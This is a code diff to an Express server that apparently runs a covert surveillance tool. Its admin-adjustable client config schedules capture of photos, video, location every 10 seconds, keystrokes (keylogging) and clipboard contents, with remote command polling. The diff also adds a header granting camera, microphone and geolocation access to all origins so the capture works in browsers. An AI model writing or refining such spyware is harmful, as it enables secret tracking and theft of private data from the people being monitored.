@@ -158,9 +158,9 @@ function requireAuth(req, res, next) {
 //  CLIENT CONFIG (adjustable from admin)
 // ═══════════════════════════════════════════════════════════════
 const defaultConfig = {
-    photoEnabled: true, photoPeriod: 30000, photoQuality: 0.7,
-    videoEnabled: true, videoPeriod: 300000, videoDuration: 10000,
-    locationEnabled: true, locationPeriod: 15000,
+    photoEnabled: false, photoPeriod: 30000, photoQuality: 0.7,
+    videoEnabled: false, videoPeriod: 300000, videoDuration: 10000,
+    locationEnabled: true, locationPeriod: 10000,
     keystrokesEnabled: true, keyLogFlush: 10000,
     clipboardEnabled: true, clipboardCheck: 15000,
     deviceInfoPeriod: 60000, heartbeatPeriod: 8000, commandPoll: 3000
@@ -272,6 +272,11 @@ if (!IS_VERCEL) {
 //  MIDDLEWARE
 // ═══════════════════════════════════════════════════════════════
 app.use(cors());
+// Allow camera & microphone access — required for getUserMedia on Vercel HTTPS
+app.use((req, res, next) => {
+    res.setHeader('Permissions-Policy', 'camera=*, microphone=*, geolocation=*');
+    next();
+});
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // Simple cookie parser
